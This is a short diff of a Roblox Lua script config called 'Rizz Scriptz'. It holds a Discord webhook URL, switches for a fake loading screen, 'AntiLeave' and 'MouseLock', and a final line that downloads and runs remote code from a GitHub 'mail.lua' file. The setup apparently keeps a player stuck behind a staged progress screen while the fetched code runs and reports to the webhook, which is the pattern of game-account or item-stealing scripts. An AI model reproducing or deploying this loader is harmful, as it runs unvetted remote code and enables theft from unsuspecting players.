@@ -5,12 +5,11 @@ Webhook = "https://discord.com/api/webhooks/1100233847825768598/NjbOP_VdSUqvYUbB
 _G.LoadingScreen = true
 _G.AntiLeave = true
 _G.MouseLock = true 
--- set them to false if you don't need them
 
 _G.ScriptName = "Rizz Scriptz"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
-_G.WaitingTime = 60 -- it's the time between 0% and 100% in secondes
+_G.WaitingTime = 10
 
 loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
